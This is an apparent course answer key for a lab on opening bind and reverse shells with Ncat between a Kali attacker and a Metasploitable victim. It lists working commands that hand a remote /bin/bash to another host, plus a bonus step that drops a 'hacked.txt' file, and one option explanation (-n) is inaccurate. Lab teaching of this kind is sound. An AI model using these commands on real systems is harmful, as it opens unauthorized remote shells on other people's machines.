## Solution Guide: Bind and Reverse Shells and Ncat

The goal of this activity was to manually use Ncat to establish backdoors on remote hosts. Please note because IPs are not static, your answers may slightly vary. 

--- 

1. **Bind shell**: Using Ncat, set up a listener on the victim's machine so you can connect to it from the attacker's machine. After testing it, document the following: 

   - Which commands did you run on the Metasploitable machine? 

      - `nc -lvnp 4444 -e /bin/bash`

    - Which commands did you run on the Kali machine?

      - `nc 192.168.0.10 4444`

    -  Explain the syntax of of any options used.

          - `-l`: Tells Ncat to listen for incoming connection .
          - `-n`: Indicates that we are listening for numeric IP addresses.
          - `-v`: Means verbose, which will print more information about the connection.
          - `-p <port number>`: Specifies which port to listen on. 
          - `-e`: Executes a bash shell, specifically, `/bin/bash`.



2. **Reverse shell**: Using Ncat, set up a listener on the attacker's machine that is prepared for the victim's machine to connect back to it. After testing it, document the following: 

    - Which commands did you run on the Metasploitable machine? 

        - `nc 192.168.0.08 4444 -e /bin/bash`

    - Which commands did you run on the Kali machine?

        - `nc -lvnp 4444`


 
### Bonus  

Re-exploit the victim's machine, and create a `hacked.txt` file in their home folder. Verify you created the .txt file successfully by logging into the metasploitable machine and reading it. 

- Solution: `cd /home/msfadmin && echo "You've been hacked!" >> hacked.txt`


---
&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.
